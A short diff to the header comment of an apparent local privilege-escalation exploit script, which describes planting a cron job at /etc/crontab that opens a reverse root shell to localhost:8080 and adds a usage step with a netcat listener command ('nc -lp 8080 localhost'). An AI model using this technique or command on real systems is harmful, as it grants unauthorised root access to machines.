@@ -3,6 +3,10 @@
 # Add a job to /etc/crontab that tries to open a reverse root shell at
 # localhost:8080 every minute. A backup of /etc/crontab is stored in $HOME
 # before modifying the file.
+#
+# Once the exploit completes, open a TCP server on localhost:8080. For example:
+#
+#	nc -lp 8080 localhost
 
 . "$(dirname "$0")/common.sh"
 
